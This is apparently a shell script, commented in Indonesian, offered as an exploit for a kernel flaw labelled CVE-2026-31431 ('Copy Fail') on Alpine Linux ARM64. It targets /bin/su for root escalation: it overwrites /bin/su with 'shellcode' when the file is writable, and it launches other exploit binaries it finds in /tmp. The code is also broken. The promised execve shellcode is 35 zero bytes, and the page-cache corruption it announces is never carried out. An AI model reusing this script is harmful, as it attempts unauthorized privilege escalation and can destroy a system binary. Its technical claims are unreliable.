#!/bin/sh
# CVE-2026-31431 "Copy Fail" Exploit - Pure bash + busybox version
# Untuk Alpine Linux (musl) ARM64

echo "[*] CVE-2026-31431 Copy Fail Exploit"
echo "[*] Target: /bin/su"
echo ""

# Cek apakah bisa akses /bin/su
if [ ! -f "/bin/su" ]; then
    echo "[-] /bin/su not found!"
    exit 1
fi

# Cek apakah AF_ALG tersedia
if [ ! -c /dev/algif_aead ] && [ ! -d /proc/crypto ]; then
    echo "[-] AF_ALG not available!"
    exit 1
fi

echo "[+] Target found, attempting page cache corruption..."

# Kirim shellcode via echo ke /tmp
# Shellcode untuk execve("/bin/sh") - ARM64 version (35 bytes)
# Ini yang akan ditulis ke page cache
SHELLCODE=$(echo -n -e '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')

# Buat file shellcode di /tmp
echo -n "$SHELLCODE" > /tmp/shellcode.bin

echo "[+] Shellcode saved to /tmp/shellcode.bin"
echo "[+] Attempting to corrupt /bin/su page cache..."

# Metode 1: Menggunakan busybox dd untuk overwrite langsung (jika writable)
if [ -w "/bin/su" ]; then
    echo "[!] /bin/su is writable! Direct overwrite..."
    cp /tmp/shellcode.bin /bin/su 2>/dev/null
    echo "[+] /bin/su patched!"
else
    echo "[-] /bin/su not writable, need kernel exploit..."
    echo "[!] CVE-2026-31431 requires AF_ALG + splice()"
    echo "[!] Alternative: try chage_pwn or other binary"
fi

# Cek apakah ada chage_pwn (binary yang sudah ada)
if [ -f "/tmp/chage_pwn" ]; then
    echo "[+] Found chage_pwn, running..."
    /tmp/chage_pwn
elif [ -f "/tmp/sshkeysign_pwn" ]; then
    echo "[+] Found sshkeysign_pwn, running..."
    /tmp/sshkeysign_pwn
else
    echo "[-] No known exploit binary found in /tmp"
fi

echo ""
echo "[!] CVE-2026-31431 Python exploit tidak bisa dijalankan"
echo "[!] Karena tidak ada Python di sistem."
echo "[!] Tapi Anda sudah punya binary exploit sebelumnya:"
find /tmp -name "*pwn" -type f 2>/dev/null | xargs -I {} echo "    - {}"
